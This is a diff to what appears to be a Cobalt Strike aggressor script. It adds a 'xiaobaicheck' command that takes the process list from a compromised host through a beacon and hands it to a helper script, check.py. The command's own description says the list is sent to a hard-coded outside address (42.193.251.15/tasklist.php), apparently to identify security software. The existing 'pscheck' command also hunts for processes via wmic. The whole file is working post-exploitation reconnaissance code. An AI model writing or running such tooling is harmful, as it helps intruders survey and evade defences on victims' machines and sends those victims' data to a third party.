@@ -1,4 +1,5 @@
 beacon_command_register("pscheck", "" ,"用于查找list.txt里的指定进程tlick:pscheck 1 #会自动寻找指定进程所在的路径(通过调用wmic)");
+beacon_command_register("xiaobaicheck", "" ,"由刨洞群的小白师傅在线进程检测提供,请求http://42.193.251.15/tasklist.php 获取返回结果");
 alias pscheck {
 	$find = $2;
 	$fhanle = openf(script_resource("list.txt"));
@@ -21,5 +22,30 @@ alias pscheck {
 			}
 		 }
       }
+    }, $callback => $2));
+}
+
+alias xiaobaicheck{
+	btask($1, "远程请求http://42.193.251.15/tasklist.php 获取进程列表");
+	$text =	"";
+	bps($1, lambda({
+    local('$pid $name $entry');
+    foreach $entry (split("\n", $2)) {
+        ($name, $null, $pid) = split("\\s+", $entry);
+		$text .=  "$name $pid"."RaidEnMei41300000000000000000000000";
+    }
+	$pypath = script_resource("check.py");
+	btask(1, "$pypath");
+	$cwd = script_resource("");
+	$process = exec("python $pypath \"$text\" $cwd");
+	@data = readAll($process);
+	closef($process);
+	#sleep(3 * 1000);
+	$fhanle = openf(script_resource("result_process.txt"));
+	$fdata = readAll($fhanle);
+	closef($fhanle);
+	foreach $value ($fdata){
+		btask($1, $value);
+	}
     }, $callback => $2));
 }
